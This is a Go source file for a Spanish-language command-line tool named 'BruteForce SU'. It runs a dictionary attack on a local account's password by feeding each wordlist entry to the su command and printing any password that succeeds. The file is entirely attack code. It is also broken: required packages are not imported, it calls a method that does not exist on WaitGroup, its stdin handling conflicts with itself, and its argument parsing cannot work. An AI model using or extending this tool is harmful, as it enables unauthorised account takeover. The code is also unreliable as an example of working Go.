package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"sync"
	"syscall"
)

var (
	mu sync.Mutex
)

func mostrarAyuda() {
	fmt.Printf("Uso: %s USUARIO DICCIONARIO [-t|--threads NUMERO]\n", os.Args[0])
	fmt.Println("Se deben especificar tanto el nombre de usuario como el archivo de diccionario.")
	os.Exit(1)
}

func imprimirBanner() {
	fmt.Println("\033[1;34m")
	fmt.Println("******************************")
	fmt.Println("*     BruteForce SU         *")
	fmt.Println("******************************")
	fmt.Println("\033[0m")
}

func finalizar(signal os.Signal) {
	fmt.Printf("\033[1;31m\nFinalizando el script\033[0m")
	os.Exit(0)
}

func probarContraseña(password string, usuario string, wg *sync.WaitGroup) {
	defer wg.Done()

	mu.Lock()
	defer mu.Unlock()

	command := exec.Command("su", usuario, "-c", "echo Hello")
	command.Stdin = os.Stdin
	command.Stdout = os.Stdout
	command.Stderr = os.Stderr
	command.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	passwordReader, err := command.StdinPipe()
	if err != nil {
		fmt.Println("Error creando la tubería de entrada estándar:", err)
		return
	}

	if err := command.Start(); err != nil {
		fmt.Println("Error iniciando el comando:", err)
		return
	}

	if _, err := passwordReader.Write([]byte(password + "\n")); err != nil {
		fmt.Println("Error escribiendo en la tubería de entrada estándar:", err)
		return
	}

	passwordReader.Close()

	if err := command.Wait(); err == nil {
		fmt.Printf("\033[1;32mContraseña encontrada para el usuario %s: %s\033[0m\n", usuario, password)
		syscall.Kill(-command.Process.Pid, syscall.SIGKILL) // Matar todos los procesos en el grupo de procesos
	}
}

func ataqueConGoroutines(diccionario string, usuario string, numThreads int) {
	var wg sync.WaitGroup

	file, err := os.Open(diccionario)
	if err != nil {
		fmt.Printf("Error abriendo el archivo %s: %s\n", diccionario, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		wg.Add(1)
		password := scanner.Text()
		go probarContraseña(password, usuario, &wg)

		// Limitar el número de goroutines
		if numThreads > 0 {
			if wg.Len() >= numThreads {
				wg.Wait()
			}
		}
	}

	wg.Wait()
}

func main() {
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-signalCh
		finalizar(nil)
	}()

	usuario := ""
	diccionario := ""
	numThreads := 10

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "-t", "--threads":
			i++
			if i < len(os.Args) {
				numThreads = atoi(os.Args[i])
			} else {
				mostrarAyuda()
			}
		case usuario:
			usuario = os.Args[i]
		case diccionario:
			diccionario = os.Args[i]
		default:
			mostrarAyuda()
		}
	}

	if usuario == "" || diccionario == "" {
		mostrarAyuda()
	}

	imprimirBanner()
	ataqueConGoroutines(diccionario, usuario, numThreads)
}

func atoi(s string) int {
	n, err := strconv.Atoi(s)
	if err != nil {
		fmt.Println("Error convirtiendo a entero:", err)
		os.Exit(1)
	}
	return n
}
